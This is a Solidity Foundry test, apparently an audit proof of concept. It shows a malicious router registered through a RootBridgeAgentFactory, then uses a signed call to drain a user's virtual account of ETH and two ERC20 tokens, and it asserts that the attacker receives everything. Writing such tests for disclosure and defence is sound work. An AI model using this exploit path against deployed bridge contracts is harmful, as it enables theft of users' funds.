	function testMaliciousRouter() public {
        address attacker = address(0xbabebeef);
        address user = address(0xbaba);
        VirtualAccount userVA = rootPort.fetchVirtualAccount(user);

        // add assets to user's virtual account
        hevm.deal(address(userVA), 10 ether);
        ftmNativeAssethToken.mint(address(userVA), 10000 * 1e18);
        ftmNativeToken.mint(address(userVA), 100 * 1e18);

        // Deployment Process
        // 1. deploy Malicious Router
        // 2. deploy new RootBridgeAgent via createBridgeAgent() on
        //    RootBridgeAgentFactory with malicious router address
        // 3. add BranchBridgeAgent pair of RootBA with valid router and params via CoreRootRouter - addBranchToBridgeAgent
        // 4. initalize router with Bridge Agent and add ERC20s to extract from virtual account

        hevm.startPrank(attacker);
        // 1
        MaliciousRouter altRouter = new MaliciousRouter(attacker);
        // 2
        RootBridgeAgent rootBridgeAgent = RootBridgeAgent(
            payable(RootBridgeAgentFactory(bridgeAgentFactory).createBridgeAgent(address(altRouter)))
        );
        RootBridgeAgentExecutor rootBridgeAgentExecutor = RootBridgeAgentExecutor(rootBridgeAgent.bridgeAgentExecutorAddress());
        // 4
        altRouter.initialize(address(rootBridgeAgent));
        altRouter.addERC20(address(ftmNativeAssethToken));
        altRouter.addERC20(address(ftmNativeToken));
        hevm.stopPrank();

        // Call process
        // 1. user calls callOutSigned() or any other signed calls on BranchBridgeAgent
        // 2. BranchBridgeAgent sends it to Lz Endpoint
        // 3. RootBridgeAgent receives it as 0x04 payload
        // 4. RootBridgeAgent approves malicious router on RootPort
        // 5. RootBridgeAgent calls RootBridgeAgentExecutor executeSignedNoDeposit() with account, router params
        // 6. RootBridgeAgentExecutor calls execute() on MaliciousRouter
        // 7. RootBridgeAgent disapproves router
        // 8. attacker have stolen all of virtual account balance

        // below transactions simulate handling 0x04 payload (nonBlockingLzReceive() on RootBridgeAgent)
        // 3
        hevm.startPrank(address(rootBridgeAgent));
        // 4
        rootPort.toggleVirtualAccountApproved(userVA, address(altRouter));
        // 5 - 6
        rootBridgeAgentExecutor.executeSignedNoDeposit(address(userVA), address(altRouter), bytes("000000000000000000000000000000"), uint16(3));
        // 7
        rootPort.toggleVirtualAccountApproved(userVA, address(altRouter));

        // 8 - virtual account has 0 balance
        require(address(userVA).balance == 0);
        require(IERC20(address(ftmNativeAssethToken)).balanceOf(address(userVA)) == 0);
        require(IERC20(address(ftmNativeToken)).balanceOf(address(userVA)) == 0);

        // 8 - attacker has all the assets
        require(attacker.balance == 10 ether);
        require(IERC20(address(ftmNativeAssethToken)).balanceOf(attacker) ==  10000 * 1e18);
        require(IERC20(address(ftmNativeToken)).balanceOf(attacker) == 100 * 1e18);
    }

